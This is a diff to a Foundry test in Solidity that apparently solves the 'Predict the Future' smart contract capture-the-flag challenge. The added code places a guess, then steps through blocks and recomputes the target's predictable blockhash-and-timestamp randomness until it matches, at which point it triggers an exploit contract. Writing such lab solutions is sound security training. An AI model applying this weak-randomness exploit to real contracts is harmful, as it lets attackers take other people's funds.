@@ -22,8 +22,28 @@ contract PredictTheFutureTest is Test {
         vm.warp(93582192);
 
         // Put your solution here
+        exploitContract.guess{value: 1 ether}(0);
+        vm.roll(block.number +1);
+        uint8 answer;
+        for (uint i = 0; i < 10; i++) {
+            answer = uint8(
+                uint256(
+                    keccak256(
+                        abi.encodePacked(
+                            blockhash(block.number - 1),
+                            block.timestamp
+                        )
+                    )
+                )
+            ) % 10;
+            if (answer == 0) {
+                exploitContract.exploit(); 
+                _checkSolved();
+                break;
+            }
+            vm.roll(block.number +1);
+        }
 
-        _checkSolved();
     }
 
     function _checkSolved() internal {
